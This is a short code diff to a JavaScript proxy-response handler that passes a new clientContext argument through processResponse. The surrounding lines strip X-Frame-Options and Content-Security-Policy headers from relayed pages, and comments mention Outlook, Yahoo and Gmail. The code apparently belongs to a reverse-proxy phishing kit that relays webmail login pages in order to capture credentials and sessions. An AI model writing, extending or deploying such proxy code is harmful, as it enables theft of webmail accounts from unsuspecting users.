@@ -197,7 +197,7 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
     }
 
 
-    processResponse() {
+    processResponse(clientContext) {
         // Simple response handling like Outlook/Yahoo
         this.browserEndPoint.removeHeader('X-Frame-Options')
         this.browserEndPoint.removeHeader('Content-Security-Policy')
@@ -214,7 +214,7 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
             const rLocation = extRedirectObj.url
             console.log('Redirect detected:', rLocation)
             // Let Gmail redirects pass through normally
-            return super.processResponse()
+            return super.processResponse(clientContext)
         }
 
         // Apply basic regex replacements
